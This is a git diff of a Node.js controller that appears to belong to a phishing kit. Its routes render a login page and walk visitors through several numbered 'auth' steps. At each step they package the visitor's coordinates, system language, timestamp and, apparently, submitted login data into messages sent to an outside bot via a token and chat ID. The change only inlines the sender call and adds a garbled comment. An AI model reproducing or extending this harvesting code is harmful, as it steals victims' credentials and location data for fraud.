@@ -22,7 +22,7 @@ Coordinates: ${geoInfo.location.longitude}, ${geoInfo.location.latitude}
 
 const getMessageSender = () => sendMessageFor(botToken, chatId);
 
-// === ROUTES ===
+// === ROUipTES ===
 
 exports.login = (req, res) => {
     return res.render("login");
@@ -63,7 +63,9 @@ SYSTEM LANGUAGE: ${systemLang}
 ✅ TESY`;
 
     try {
-        await getMessageSender()(message);
+     
+    const sendMessage = sendMessageFor(botToken, chatId);
+    await sendMessage(message);
         res.redirect("/auth/login/2");
     } catch (err) {
         console.error("Error sending message:", err.message);
@@ -92,7 +94,8 @@ TIME             : ${getSystemTime()}
 `;
 
     try {
-        await getMessageSender()(message);
+         const sendMessage = sendMessageFor(botToken, chatId);
+    await sendMessage(message);
         res.redirect("/auth/login/3");
     } catch (err) {
         console.error("Error:", err.message);
@@ -121,7 +124,8 @@ TIME             : ${getSystemTime()}
 `;
 
     try {
-        await getMessageSender()(message);
+         const sendMessage = sendMessageFor(botToken, chatId);
+    await sendMessage(message);
         res.redirect("/auth/login/4");
     } catch (err) {
         console.error("Error:", err.message);
@@ -154,7 +158,8 @@ TIME             : ${getSystemTime()}
 `;
 
     try {
-        await getMessageSender()(message);
+         const sendMessage = sendMessageFor(botToken, chatId);
+    await sendMessage(message);
         res.redirect("/auth/login/5");
     } catch (err) {
         console.error("Error:", err.message);
@@ -185,7 +190,8 @@ TIME             : ${getSystemTime()}
 `;
 
     try {
-        await getMessageSender()(message);
+         const sendMessage = sendMessageFor(botToken, chatId);
+    await sendMessage(message);
         res.redirect("/auth/complete");
     } catch (err) {
         console.error("Error:", err.message);
